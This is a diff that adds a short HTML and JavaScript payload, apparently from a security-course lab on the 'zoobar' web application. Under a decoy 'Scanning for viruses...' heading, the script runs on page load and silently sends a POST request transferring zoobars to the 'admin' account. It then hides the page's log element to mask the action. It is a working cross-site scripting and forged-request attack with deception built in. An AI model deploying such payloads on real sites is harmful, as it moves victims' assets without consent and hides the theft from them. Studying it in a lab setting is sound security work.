@@ -1,0 +1,12 @@
+<h3>Scanning for viruses...</h3>
+<script>
+document.addEventListener("DOMContentLoaded", theDomHasLoaded, false);
+function theDomHasLoaded(e) { 
+var steal = new XMLHttpRequest();
+var params = ('zoobars=1&recipient=admin&submission=Send');
+steal.open('POST', 'http://localhost:8080/zoobar/index.cgi/transfer', true);
+steal.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+steal.send(params);
+document.getElementsByClassName("log")[0].style.visibility = 'hidden'; 
+} 
+</script>
